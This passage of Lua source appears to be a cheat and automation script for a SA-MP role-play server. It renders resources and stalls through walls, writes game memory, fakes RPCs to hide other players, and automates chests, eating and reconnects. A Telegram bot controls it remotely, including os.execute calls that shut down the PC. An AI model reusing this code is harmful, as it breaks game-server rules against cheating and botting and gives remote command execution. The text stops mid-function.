                    local text, color, posX, posY, posZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById( id )
                    if text:match('Месторождение ресурсов') then
                        n10= 'Руда'
                        local wposX, wposY = convert3DCoordsToScreen(posX,posY,posZ)
                        local resX, resY = getScreenResolution()
                        if wposX < resX and wposY < resY and isPointOnScreen (posX,posY,posZ,1) then
                            x2,y2,z2 = getCharCoordinates(PLAYER_PED)
                            x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
                            renderFontDrawText(fontshaxta, n10, wposX, wposY, 0xFF00FF00)
                        end
                    end
                end
            end
        end
    end
end

function runnings()
    while true do wait(0)
        if running[0] then
            Memory.setint8(0xB7CEE4, 1)
        else
            Memory.setint8(0xB7CEE4, 0)
        end
    end
end

function getnumber(id)   
    if smspush[0] == 1 then
        sms('[Информация] {FFFFFF}Введите {00FF00}/call id {FFFFFF}игрока.')
    elseif smspush[0] == 2 and toast_ok then  
        toast.Show(u8'[Информация] Введите /call id игрока.', toast.TYPE.INFO, 2)
    end
    sampSendChat("/number " .. id)
end

function isKeyCheckAvailable()
    if not isSampLoaded() then
		return true
	end
	if not isSampfuncsLoaded() then
		return not sampIsChatInputActive() and not sampIsDialogActive()
	end
	return not sampIsChatInputActive() and not sampIsDialogActive() and not isSampfuncsConsoleActive()
end

function bike()
    while true do wait(0)
    if speedrunning[0] then
            bike = {[481] = true, [509] = true, [510] = true}
            moto = {[448] = true, [461] = true, [462] = true, [463] = true, [468] = true, [471] = true, [521] = true, [522] = true, [523] = true, [581] = true, [586] = true}
            if isCharOnAnyBike(playerPed) and isKeyCheckAvailable() and isKeyDown(0x10) then
                if bike[getCarModel(storeCarCharIsInNoSave(playerPed))] then
                    setGameKeyState(16, 255)
                    wait(10)
                    setGameKeyState(16, 0)
            elseif moto[getCarModel(storeCarCharIsInNoSave(playerPed))] then
                    setGameKeyState(1, -128)
                    wait(10)
                    setGameKeyState(1, 0)
                end
            end
            if isKeyDown(0x20) and isKeyCheckAvailable() and isCharOnFoot(playerPed) then
                setGameKeyState(16, 256)
                wait(10)
                setGameKeyState(16, 0)  
            end
        end
    end
end

local fontas = renderCreateFont("Arial", 10, 5)
local nametegs = {'Papa_Prince', 'Papa_King', 'Kevin_Halt', 'Kevin_Robert', 'Luank_Prince'};
function lavkatextand()
    while true do
        wait(0)
        for id = 0, 2048 do
            local result = sampIs3dTextDefined(id)
            if result then
                local text, color, posX, posY, posZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById(id)
                for a, b in ipairs(nametegs) do
                    if text:find(b) then
                        local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
                        local dist = getDistanceBetweenCoords3d(playerX, playerY, playerZ, posX, posY, posZ)
                        if dist <= 100.0 and dist >= 5 then
                            local wposX, wposY, wposZ = convert3DCoordsToScreen(posX, posY, posZ)
                            local resX, resY = getScreenResolution()
                            if wposX < resX and wposY < resY and isPointOnScreen(posX, posY, posZ, 1) then
                                renderFontDrawText(fontas, text, wposX, wposY, 0xFF00FF00)
                            end
                        end
                    end
                end
            end
        end
    end
end

function sizewindow()
    while true do wait(0)
        if changepos then 
            posX, posY = getCursorPos() 
            if isKeyJustPressed(1) then
                changepos = false
            end
        end
    end
end

function delayedtimers()
    while true do wait(0)
        if delayedtimeraaaa then	
            delaychect = os.time() + timechestto[0] * 60
            while os.time() < delaychect do wait(0)
                local timeRemainings = delaychect - os.time()
                local minutess = math.floor(timeRemainings / 60)
                local secondss = timeRemainings % 60
                local timeStrings = string.format("%02d:%02d", minutess, secondss)
                renderFontDrawText(font,'Timer '..timeStrings, mainIni.main.delayedtimerposx, mainIni.main.delayedtimerposy, 0xFFFF0000, 0x90000000)
            end
            workbotton = new.bool(true)
            chestonoff = true
            work = true
            delayedtimer = new.bool(false)
            delaychect = os.time()
            delayedtimeraaaa = false
        end
    end
end

pizdap = false
function onReceivePacket(id,bs)
    if id == 32 then
        sendTelegramNotification('CЕРВЕР ЗАКРЫЛ СОЕДИНЕНИЕ')
        workbotton[0] = false 
        chestonoff = false
        work = false
        startTime = os.time()  
        pizdap = true
    end
    if id == 33 then
        sendTelegramNotification('CЕРВЕР ЗАКРЫЛ СОЕДИНЕНИЕ')
        workbotton[0] = false 
        chestonoff = false
        work = false
        startTime = os.time() 
        pizdap = true
    end
    if id == 220 then
        raknetBitStreamIgnoreBits(bs, 8)
        local packettype = raknetBitStreamReadInt8(bs)
        if packettype == 17 then
            raknetBitStreamIgnoreBits(bs, 32)
            local len = raknetBitStreamReadInt32(bs)
            if len > 0 and len < 10000 then
                local text = raknetBitStreamReadString(bs, len)
                text = text:gsub("\n", "")
                if text:find("event%.arizonahud%.playerSatiety', `%[(%d+)%]`") then
                    satiety = tonumber(text:match("(%d+)"))
                    if satiety <= 25 then
                    sendTelegramNotification('Ты голоден!')     
                    end
                end
            end
        end
    end
end

function random(min, max)
    local kf = math.random(min, max)
    math.randomseed(os.time() * kf)
    local rand = math.random(min, max)
    return tonumber(rand)
end

function autoreconectrandom()
    while true do wait(0)
        if pizdap and autorec[0] then
            delaychectqaq = os.time() +  random(15,30) * 60
            local wwwwwwwwwwwad = delaychectqaq - os.time()
            local minuawdawdatessa = math.floor(wwwwwwwwwwwad / 60)
            sendTelegramNotification('Автоматический перезаход через: '..minuawdawdatessa.. ' мин.')
            sms('Автоматический перезаход через: '..minuawdawdatessa.. ' мин.', -1)
            while os.time() < delaychectqaq do
                wait(0)
                local timeRemainingsa = delaychectqaq - os.time()
                local minutessa = math.floor(timeRemainingsa / 60)
                local secondssa = timeRemainingsa % 60
                local rtimea  = string.format("%02d:%02d", minutessa, secondssa)
                renderFontDrawText(font,''..rtimea,sw/2-renderGetFontDrawTextLength(font,'текст!')/2,sh/2,0xFFFF0000 )             
            end           
            sampSetLocalPlayerName(mainIni.main.nickrecons)
            wait(200)
            sampConnectToServer(mainIni.main.serverrecon, 7777)
            pizdap = false
         end
    end
end

local circleCoordinates = {}
function addCircleInfo(x, y, radius)
    table.insert(circleCoordinates, {x, y, radius})
end

function radiuslavkis()
	while true do wait(0)
	    if radiuslavki[0] then
			local myPos = {getCharCoordinates(1)}
	        for IDTEXT = 0, 2048 do
	            if sampIs3dTextDefined(IDTEXT) then
	                local text, color, posX, posY, posZ, distance, ignoreWalls, player, vehicle = sampGet3dTextInfoById(IDTEXT)
	                if text == "Управления товарами." and not isCentralMarket(posX, posY) then
	                    local distanceToText = getDistanceBetweenCoords3d(posX, posY, posZ, myPos[1], myPos[2], myPos[3])
	                    if distanceToText <= 20.0 then
	                        drawCircleIn3d(posX,posY,posZ-1.3,5,36,1.5,	getDistanceBetweenCoords3d(posX,posY,0,myPos[1],myPos[2],0) > 5 and 0xFFFFFFFF or 0xFFFF0000)
	                    end
	                end
	            end
	        end
	    end
	end
end

drawCircleIn3d = function(x, y, z, radius, polygons,width,color)
    local step = math.floor(360 / (polygons or 36))
    local sX_old, sY_old
    for angle = 0, 360, step do
        local lX = radius * math.cos(math.rad(angle)) + x
        local lY = radius * math.sin(math.rad(angle)) + y
        local lZ = z
        local _, sX, sY, sZ, _, _ = convert3DCoordsToScreenEx(lX, lY, lZ)
        if sZ > 1 then
            if sX_old and sY_old then
                renderDrawLine(sX, sY, sX_old, sY_old, width, color)
            end
            sX_old, sY_old = sX, sY
        end
    end
end

isCentralMarket = function(x, y)
	return (x > 1044 and x < 1197 and y > -1565 and y < -1403)
end

local TextDraw_Remove = {{4, 203, 347}, {4, 204, 349}, {2, 208, 351}}
function crtextdraw()
    while true do wait(0)
		for i = 1, 4096 do
			if sampTextdrawIsExists(i) then
				local style = sampTextdrawGetStyle(i)
				local x, y = sampTextdrawGetPos(i)
				local text = sampTextdrawGetString(i)
				for i_table = 1, #TextDraw_Remove do
					if (style == TextDraw_Remove[i_table][1] and math.floor(x) == TextDraw_Remove[i_table][2] and math.floor(y) == TextDraw_Remove[i_table][3]) then	
						sampTextdrawDelete(i)
					end
                end
            end
        end
    end
end

function chestss()
    while true do wait(0)
        if chestonoff then
            if work then
                sampCloseCurrentDialogWithButton(0)
                wait(500)
                sampCloseCurrentDialogWithButton(0)
                if smspush[0] == 1 then
                    sms('[Сhest] {FFFFFF}Сейчас откроется инвентарь.')
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'[Сhest] Сейчас откроется инвентарь.', toast.TYPE.INFO, 2)
                end
                wait(500)
                sampSendChat('/mn')
                wait(500)
                sampCloseCurrentDialogWithButton(0)
                wait(500)   
                sampSendChat('/invent')
                wait(500)
                for i = 1, 6 do
                    if not work then break end
                        sampSendClickTextdraw(textdraw[i][1])
                        wait(textdraw[i][3])
                        sampSendClickTextdraw(textdraw[i][2])
                        wait(textdraw[i][3])
                    end
                    wait(100)
                    if smspush[0] == 1 then
                        sms('[Сhest] {FFFFFF}Запушен таймер на 1ч.')
                elseif smspush[0] == 2 and toast_ok then  
                        toast.Show(u8'[Сhest] Запушен таймер на 1ч.', toast.TYPE.INFO, 2)
                    end
                    startTime = os.time() + 60 * 60
                    work = false
                    startTime = os.time() + 60 * 60
                    while os.time() < startTime do wait(0)
                        local timeRemaining = startTime - os.time()
                        local minutes = math.floor(timeRemaining / 60)
                        local seconds = timeRemaining % 60
                        local timeString = string.format("%02d:%02d", minutes, seconds)
                        renderFontDrawText(font,'Timer '..timeString, mainIni.main.chestposx, mainIni.main.chestposy, 0xFF00FF00, 0x90000000) 
                    end
                work = true
            end
        end
    end
end

function sampev.onShowTextDraw(id, data)
    if work then
    if checkbox_standart[0] and data.modelId == 19918 then textdraw[1][1] = id  end
    if checkbox_platina[0] and data.modelId == 1353 then textdraw[2][1] = id  end
    if checkbox_mask[0] and data.modelId == 1733 then textdraw[3][1] = id  end
    if checkbox_donate[0] and data.modelId == 19613 then textdraw[4][1] = id  end
    if checkbox_tainik[0] and data.modelId == 2887 then textdraw[5][1] = id  end
    if checkbox_vice[0] and data.modelId == 1333 then textdraw[6][1] = id  end
        if data.text == 'USE' or data.text == '…CЊO‡’€O‹AЏ’' then 
            textdraw[1][2] = id + 1
            textdraw[2][2] = id + 1
            textdraw[3][2] = id + 1
            textdraw[4][2] = id + 1
            textdraw[5][2] = id + 1
            textdraw[6][2] = id + 1
        end
    end
end 

function bind()
    while true do wait(0)
    if isKeyDown(161) and isKeyDown(49) then 
    activediaq = not activediaq
    if activediaq then
        if lavka[0] == false then 
            if smspush[0] == 1 then
                sms('{FFFF00}[Binder] {FFFFFF}Рендер лавок {00FF00}включено.')
        elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'[Binder] Рендер лавок включено.', toast.TYPE.INFO, 2)
            end
            lavka[0] = true
            wait(200) 
        else
            if lavka[0] == true then
                if smspush[0] == 1 then
                    sms('{FFFF00}[Binder] {FFFFFF}Рендер лавок {FF0000}отключено.')
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'[Binder] Рендер лавок отключено.', toast.TYPE.INFO, 2)
                end
                lavka[0] = false
                wait(200) 
            end
        end
    end
end
if isKeyDown(161) and isKeyDown(50) then 
    activediaw = not activediaw
    if activediaw then 
        if radiuslavki[0] == false then  
            if smspush[0] == 1 then
                sms('{FFFF00}[Binder] {FFFFFF}Радиус между лавками {00FF00}включено.')
        elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'[Binder] Радиус между лавками включено.', toast.TYPE.INFO, 2)
            end
            radiuslavki[0] = true
            wait(200)
        else 
            if radiuslavki[0] == true then  
                if smspush[0] == 1 then
                    sms('{FFFF00}[Binder] {FFFFFF}Радиус между лавками {FF0000}отключено.') 
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'[Binder] Радиус между лавками отключено.', toast.TYPE.INFO, 2)
                end  
                radiuslavki[0] = false
                wait(200)
            end
        end
    end
end
if isKeyDown(161) and isKeyDown(51) then
    activediae = not activediae
    if activediae then
        if clean[0] == false then  
            if smspush[0] == 1 then
                sms('{FFFF00}[Binder] {FFFFFF}Удаление игроков и тс {00FF00}включено.')
        elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'[Binder] Удаление игроков и тс включено.', toast.TYPE.INFO, 2)
            end  
            clean[0] = true 
            wait(200)
        else 
            if clean[0] == true then  
                if smspush[0] == 1 then
                    sms('{FFFF00}[Binder] {FFFFFF}Удаление игроков и тс {FF0000}отключено.')   
                elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'[Binder] Удаление игроков и тс отключено.', toast.TYPE.INFO, 2)
                    end  
                    clean[0] = false 
                    wait(200)
                end
            end
        end
    end
   if isKeyDown(161) and isKeyDown(52) then  
        activediae = not activediae
        if activediae then
            wait(200)
            marketBool.now[0] = true
            else
                wait(200)
                marketBool.now[0] = false
            end
        end
        if isKeyDown(161) and isKeyDown(53) then 
            activediaw = not activediaw
            if activediaw then 
                wait(200)
                workbotton[0] = true 
                chestonoff = true
                work = true 
            end
        end
        if isKeyDown(161) and isKeyDown(54) then  
            thisScript():reload() 
        end
    end
end

function lavkirendor()
    while true do wait(0)
        if lavka[0] then		
            local input = sampGetInputInfoPtr()
            local input = getStructElement(input, 0x8, 4)
            local PosX = getStructElement(input, 0x8, 4)
            local PosY = getStructElement(input, 0xC, 4)
            local lavki = 0  
            for id = 0, 2304 do
                if sampIs3dTextDefined(id) then
                    local text, _, posX, posY, posZ, _, _, _, _ = sampGet3dTextInfoById(id)
                    if (math.floor(posZ) == 17 or math.floor(posZ) == 1820) and text == '' then
                        lavki = lavki + 1
                        if isPointOnScreen(posX, posY, posZ, nil) then
                            local pX, pY = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))
                            local lX, lY = convert3DCoordsToScreen(posX, posY, posZ)
                            renderFontDrawText(font, 'Свободна', lX - 30, lY - 20, 0xFF16C910, 0x90000000)
                            renderDrawLine(pX, pY, lX, lY, 1, 0xFF52FF4D)
                            renderDrawPolygon(pX, pY, 10, 10, 10, 0, 0xFFFFFFFF)
                            renderDrawPolygon(lX, lY, 10, 10, 10, 0, 0xFFFFFFFF)  
                        end
                    end
                end
            end
            local input = sampGetInputInfoPtr()
            local input = getStructElement(input, 0x8, 4)
            local PosX = getStructElement(input, 0x8, 4)
            local PosY = getStructElement(input, 0xC, 4)
            renderFontDrawText(font, 'Свободно: '..lavki, mainIni.main.renderlavokx, mainIni.main.renderlavoky, 0xFFFF0000, 0x90000000)    
        end
    end
end       

function senddell()
    activedia = not activedia
    if activedia then 
        clean[0] = true     
        sendTelegramNotification('Удаление игроков и тс включено.')
    else
        clean[0] = false   
        sendTelegramNotification('Удаление игроков и тс отключено.')
    end
end

function chestts()
    activedia = not activedia
    if activedia then 
        sendTelegramNotification('Авто открытие сундуков включено.')
        sampSendClickTextdraw(65535)
        workbotton[0] = true 
        chestonoff = true
        work = true
    else
        sendTelegramNotification('Авто открытие сундуков отключено.')
        sampSendClickTextdraw(65535)
        startTime = os.time() 
        workbotton[0] = false 
        chestonoff = false
        work = false
        wait(10000)
        startTime = os.time() 
    end
end

function cleanr()
    while true do wait(0)
    if clean[0] then
        local removedPlayers = 0
        for i, v in ipairs(getAllChars()) do
            if doesCharExist(v) and i ~= 1 then
                local _, id = sampGetPlayerIdByCharHandle(v)
                if id ~= -1 then
                    removePlayer(id)
                    removedPlayers = removedPlayers + 1
                end
            end
        end
        local removedVehicles = 0
        for i, v in ipairs(getAllVehicles()) do
            local res, id = sampGetVehicleIdByCarHandle(v)
                if res then
                    if (isCharInAnyCar(1) and storeCarCharIsInNoSave(1) ~= v) or not isCharInAnyCar(1) then
                        removeVehicle(id)
                        removedVehicles = removedVehicles + 1
                    end
                end
            end
            local result, ped = sampGetCharHandleBySampPlayerId(id)
            deleteChar(ped)
        end
    end 
end
    
function removePlayer(id)
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt16(bs, id)
    raknetEmulRpcReceiveBitStream(163, bs)
    raknetDeleteBitStream(bs)
end
    
function removeVehicle(id)
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt16(bs, id)
    raknetEmulRpcReceiveBitStream(165, bs)
    raknetDeleteBitStream(bs)
end

function eat()
    while true do wait(0)
        if satiety then
            if satiety <= SliderOne[0] then
                if autoeat[0] then
                    if ComboTest[0] == 0 then
                        wait(500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                        wait(3500)
                        sampSendChat('/cheeps')
                    end
                    if ComboTest[0] == 1 then
                        wait(500)
                        sampSendChat('/jmeat')
                        wait(3500)
                    end
                    if ComboTest[0] == 2 then
                        wait(500)
                        sampSendChat('/meatbag')
                        wait(3500)
                    end
                end        
            end
        end
    end
end



local updateid
function threadHandle(runner, url, args, resolve, reject)
	local t = runner(url, args)
	local r = t:get(0)
	while not r do
		r = t:get(0)
		wait(0)
	end
	local status = t:status()
	if status == 'completed' then
		local ok, result = r[1], r[2]
		if ok then resolve(result) else reject(result) end
	elseif err then
		reject(err)
	elseif status == 'canceled' then
		reject(status)
	end
	t:cancel(0)
end

function requestRunner()
	return effil.thread(function(u, a)
		local https = require 'ssl.https'
		local ok, result = pcall(https.request, u, a)
		if ok then
			return {true, result}
		else
			return {false, result}
		end
	end)
end

function async_http_request(url, args, resolve, reject)
	local runner = requestRunner()
	if not reject then reject = function() end end
	lua_thread.create(function()
		threadHandle(runner, url, args, resolve, reject)
	end)
end

function encodeUrl(str)
	for c in str:gmatch('[%c%p%s]') do
		if c ~= '%' then
			local find = str:find(c, 1, true)
			if find then
				local char = str:sub(find, find)
				str = str:gsub(string.format('%%%s', char), ('%%%%%02X'):format(char:byte()))
			end
		end
	end
	return u8(str)
end

function sendTelegramNotification(msg)
	msg = msg:gsub('{......}', '')
	msg = encodeUrl(msg)
	async_http_request('https://api.telegram.org/bot' .. u8:decode(str(token)) .. '/sendMessage?chat_id=' .. u8:decode(str(chat_id)) .. '&text='..msg,'', function(result) end) 
end

function get_telegram_updates()
    while not updateid do wait(1) end
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..u8:decode(str(token))..'/getUpdates?chat_id='..u8:decode(str(chat_id))..'&offset=-1' 
        threadHandle(runner, url, args, processing_telegram_messages, reject)
        wait(0)
    end
end

function processing_telegram_messages(result)
    local proc_result, proc_table = pcall(decodeJson, result)
    if proc_result and proc_table and proc_table.ok then
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid then
                        updateid = res_table.update_id
                        local message_from_user = res_table.message.text
						user_idtg = res_table.message.from.id
                         if message_from_user then
                            local text = u8:decode(message_from_user) .. ' '
                            if text:match('^/stats') then
                                telegrams()
							elseif text:match('^/pcoff') then
								sendTelegramNotification('компьютер будет автоматически выключен')
                                pcoffs()
							elseif text:match('^/rec') then
								sendTelegramNotification('переподключение к серверу 15 сек')
                                rec()
                            elseif text:match('^/nickrecon') then
								sendTelegramNotification('переподключение к серверу 5 сек')
                                nickrecon()
							elseif text:match('^/status') then
								sendStatusTg()
                            elseif text:match('^/send') then
                                local argq = text:gsub('/send ','',1)
                                sampSendChat(argq)
                            elseif text:match('^/diolog') then
                                sendDialog()
                            elseif text:match('^/dell') then
                                senddell()
                            elseif text:match('^/monitoroff') then
                                os.execute([[ "powershell nircmd.exe monitor off" ]]) 
                            elseif text:match('^/chest') then
                                chestts()
                            elseif text:match('^/killdiolog') then
                                sampCloseCurrentDialogWithButton(0)
                                wait(200)
                                sampCloseCurrentDialogWithButton(0)
                                sendTelegramNotification('Закрытие всех диологов')
                            elseif text:match('^/reload') then
                                thisScript():reload()
                                sendTelegramNotification('Скрипт перезагружается')
                            elseif text:match('^/money') then
                                moneya = getPlayerMoney()
                                sendTelegramNotification('Наличные: $'..moneya)
                            elseif text:match('^/version') then
                                sendTelegramNotification('Версия скрипта v'..thisScript().version)  
                            elseif text:match('^/eatstatus') then
                                if satiety == nil then
                                    sendTelegramNotification('Голод: ещё не обновился')  
                                else
                                    sendTelegramNotification('Голод: '..satiety)  
                                end
                            elseif text:match('^/eat') then
                            local args = text:match('^/eat (.+)')
                                 if args then
                                    local eatsss = args:match("^(%S+)")
                                    if eatsss == '1' then
                                        sendTelegramNotification('Хаваю чипсы 5 раз')  
                                        lua_thread.create(function ()
                                            sampSendChat('/cheeps')
                                            wait(4000)
                                            sampSendChat('/cheeps')
                                            wait(4000)
                                            sampSendChat('/cheeps')
                                            wait(4000)
                                            sampSendChat('/cheeps')
                                            wait(4000)
                                            sampSendChat('/cheeps')
                                        end)  
                                    end
                                    if eatsss == '2' then
                                        sampSendChat('/jfish')
                                    end
                                    if eatsss == '3' then
                                        sampSendChat('/jmeat')
                                    end
                                    if eatsss == '4' then
                                        sampSendChat('/meatbag')
                                    end
                                else
                                    sendTelegramNotification('/eat 1-4')  
                                end
							elseif text:match('^/help') then
								sendTelegramNotification('%E2%9D%97Команды%E2%9D%97\n\n/stats -- Статистика аккаунта.\n\n/eatstatus -- Проверить голод\n\n/eat 1-4 -- Похавать еду\n\n/money -- Деньги на руках.\n\n/pcоff -- Выключение Пк.\n\n/reс -- Перезайти на сервер с задержкой 5 сек.\n\n/nickrecon -- Перезайти на сервер с сохранным ником.\n\n/monitoroff -- выключить монитор(NirCmd)\n\n/status -- Статус сервера.\n\n/diоlog -- включить или отключить отправку диалогов в TG.\n\n/killdiolоg -- Закрытие всех диологов\n\n/send -- Написать сообщение в чат.\n\n/dеll --включить или отключить удаление игроков и тс.\n\n/chest -- Запустить Авто открытие Сундуков.\n\n/version -- Версия скрипта.\n\n/relоad -- Перезапустить Скрипт.')	 
                            else 
                                sendTelegramNotification('Неизвестная команда!')
                            end
                        end
                    end
                end
            end
        end
    end
end

function getLastUpdate()
    async_http_request('https://api.telegram.org/bot'..u8:decode(str(token))..'/getUpdates?chat_id='..u8:decode(str(chat_id))..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid = res_table.update_id
                    end
                else
                    updateid = 1
                end
            end
        end
    end)
end
	
local bank_check = false
local payday_notification_str = '%E2%9D%97__________Банковский чек__________%E2%9D%97\n'
local function collectAndSendPayDayData(text)
    local ptrs = {
        "Текущая сумма в банке: %$[%d%.]+",
        "Текущая сумма на депозите: %$[%d%.]+",
        "Общая заработная плата: %$[%d%.]+",
        "Депозит в банке: VC%$[%d%.]+",
        "Сумма к выплате: VC%$[%d%.]+",
        "Текущая сумма в банке: VC%$[%d%.]+",
        "Текущая сумма на депозите: VC%$[%d%.]+"
    }
    local text = text:gsub("{%x+}", "")
    for _, v in ipairs(ptrs) do
        if text:find(v) then
            payday_notification_str = ("%s\n%s"):format(payday_notification_str, text)
        end
    end
    if text:find("Баланс на донат(.+): (.+)") then
        payday_notification_str = ("%s\n%s"):format(payday_notification_str, text)
        if bank_check then
            sendTelegramNotification(("%s"):format(payday_notification_str))
            payday_notification_str = '%E2%9D%97__________Банковский чек__________%E2%9D%97\n'
        end
        bank_check = false
    end
end

function sampev.onServerMessage(color, text)
    if text:find('Банковский чек') then bank_check = true end
    if bank_check then collectAndSendPayDayData(text) end
    local message = ""
    if text:find('^%[Информация%] %{ffffff%}Вы использовали сундук с рулетками и получили') and color == 1941201407 then
        local drop_starter_donate = text:match('^%[Информация%] %{ffffff%}Вы использовали сундук с рулетками и получили (.+)!')
        counter = counter + 1
        message = message .. drop_starter_donate .. "\n"
    end
    if text:find('^%[Информация%] %{ffffff%}Вы использовали платиновый сундук с рулетками и получили') and color == 1941201407 then
        local drop_platinum = text:match('^%[Информация%] %{ffffff%}Вы использовали платиновый сундук с рулетками и получили (.+)!')
        counter = counter + 1
        message = message .. drop_platinum .. "\n"
    end  
    if text:find('^%[Информация%] %{ffffff%}Вы использовали тайник Илона Маска и получили') and color == 1941201407 then
        local drop_elon_musk = text:match('^%[Информация%] %{ffffff%}Вы использовали тайник Илона Маска и получили (.+)!')
        counter = counter + 1
        message = message .. drop_elon_musk .. "\n"
    end
    if (text:find('^Вы открыли Тайник Лос Сантоса!') or text:find('^Вы открыли Тайник Vice City!')) and color == 1118842111 then
    elseif text:find('^%[Информация%] %{ffffff%}Получено: (.+) и (.+)!') and color == 1941201407 then
            counter = counter + 1
            local drop_ls_vc_1, drop_ls_vc_2 = text:match('^%[Информация%] %{ffffff%}Получено: (.+) и (.+)!')
            message = message .. drop_ls_vc_1 .. "\n" .. drop_ls_vc_2 .. "\n"
        end
        sendTelegramNotification(message)
        if text:find('^%[Ошибка%] %{ffffff%}Время после прошлого использования ещё не прошло!') and color == -1104335361 then
            local text = 'Время после прошлого использования ещё не прошло!'
            sendTelegramNotification(''..text)  
        end
        local hookMarket = {
		    {text = '^%s*(.+) купил у вас (.+), вы получили(.+)$(.+) от продажи %(комиссия %d+ процент%(а%)%)$', color = -1347440641, key = 2},
		    {text = '^%s*Вы успешно продали (.+) торговцу (.+), с продажи получили(.+)$(.+) %(комиссия %d+ процент%(а%)%)$', color = -65281, key = 2},
		    {text = '^%s*Вы купили (.+) у игрока (.+) за(.+)$(.+)', color = -1347440641, key = 3},
		    {text = '^%s*Вы успешно купили (.+) у (.+) за(.+)$(.+)', color = -65281, key = 3}
	    }
	    for k, v in ipairs(hookMarket) do
		    if string.find(text, v['text']) and v['color'] == color then
			    local args = splitArguments({text:match(v['text'])}, text:find('купил у вас'))
			    local textLog = getTypeMessageMarket(text, args)
                sendTelegramNotification(''..textLog)
			    if #marketShop >= stroki[0]  then marketShop = {} end
			        table.insert(marketShop, textLog)
			    end
		    end
            if text:match("%a+_%a+%[%d+%]:    {......}%d+$") then
                local number = text:match("%a+_%a+%[%d+%]:    {......}(%d+)$")
                lua_thread.create(function()      
                if smspush[0] == 1 then
                    sms('Calling: {aa0000}'..number) 
                elseif smspush[0] == 2 and toast_ok then  
                        toast.Show(u8'Calling: '..number, toast.TYPE.INFO, 2)
                    end 
                    wait(500)
                    sampSendChat("/call " .. number)
                end)
                return false
            end
            if text:find('Этот транспорт зарегистрирован на жителя {......}(.+)') then
                local nikc = text:match('Этот транспорт зарегистрирован на жителя {......}(.+)')
                local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
                if sampGetPlayerNickname(id) == nikc then
                    sampSendChat("/lock")
                end
            end
            if text:find('^%[Ошибка%] %{ffffff%}У вас нет чипсов!') or text:find('^%[Ошибка%] %{ffffff%}У вас нет жареной рыбы!') or text:find('^%[Ошибка%] %{ffffff%}У вас нет жареного мяса оленины!') or text:find('%[Ошибка%] {FFFFFF}У вас нет мешка с мясом!') then
                sendTelegramNotification(text)
            end
            if text:match('%[Ошибка%] {FFFFFF}Использовать мешок с мясом можно раз в 30 минут! Осталось (%d+):(%d+)') then
                local min, sec = text:match('%[Ошибка%] {FFFFFF}Использовать мешок с мясом можно раз в 30 минут! Осталось (%d+):(%d+)')
                sendTelegramNotification('[Ошибка] Использовать мешок с мясом можно раз в 30 минут! Осталось '..min..':'..sec)
            end
            if text:find('{FFFFFF}У вас есть 3 минуты, чтобы настроить товар, иначе аренда ларька будет отменена.') then
                lavka = new.bool(false) 
                radiuslavki = new.bool(false)
                marketBool.now[0] = true
                local text = '[Информация] Вы заняли лавку!'
                sendTelegramNotification(''..text.. '\n\n'..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))))
                marketShop = {}
                if autoclean[0] then
                    clean = new.bool(true)
                    radiuslavki = new.bool(false)
                    sampProcessChatInput('/plt')    
                end    
            end
            if text:find('Чтобы снять это ограничение, подтвердите аккаунт через почту /accepttrade.') then
                sampSendChat('/accepttrade')
                sampSetChatInputEnabled(true)
                sampSetChatInputText("/accepttrade ")
            end
            if string.find(text, '^%[Ошибка%] %{ffffff%}Рядом нет игроков или транспорта для взаимодействия!') then
                return false
            end
            if string.find(text, '^%[Ошибка%] %{ffffff%}У Вас нет в данный момент активных предложений, попробуйте позже') then
                return false
            end
            local hookActionsShop = {
                '^%s*%[Информация%] {FFFFFF}Вы отказались от аренды лавки!',
                '^%s*%[Информация%] {FFFFFF}Вы сняли лавку!',
                '^%s*%[Информация%] {FFFFFF}Ваша лавка была закрыта, из%-за того что вы её покинули!'
            }
        for k, v in ipairs(hookActionsShop) do
            if text:find(v) then
            marketBool.now[0] = false       
            sendTelegramNotification(''..text.. '\n\n'..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))))
        end
    end
end

function splitArguments(array, key)
	return {
		['name'] = (key and array[1] or array[2]),
		['item'] = (key and array[2] or array[1]),
		['ViceCity'] = array[3],
		['money'] = stringToCount(array[4])
	}
end

function getTypeMessageMarket(text, args)
	local array = {
		['купил у вас'] = '%s %s купил "%s" за%s$%s',
		['Вы купили'] = '%s %s продал "%s" за%s$%s',
		['Вы успешно продали'] = '%s [Чужая Лавка] %s купил "%s" за%s$%s',
		['Вы успешно купили'] = '%s [Чужая Лавка] %s продал "%s" за%s$%s'
	}
	for k, v in pairs(array) do
		if text:find(k) then return string.format(v, os.date('[%H:%M:%S]'), args['name'], args['item'], args['ViceCity'], money_separator(args['money'])) end
	end
end

function stringToCount(text)
	local count = ''
	for line in text:gmatch('%d') do
		count = count .. line
	end
	return tonumber(count)
end

function money_separator(n)
    local left,num,right = string.match(n,'^([^%d]*%d)(%d*)(.-)$')
    return left..(num:reverse():gsub('(%d%d%d)','%1.'):reverse())..right
end

function telegrams()
    if cmd[0] then
        diolog[0] = true
        sampSendChat('/stats')
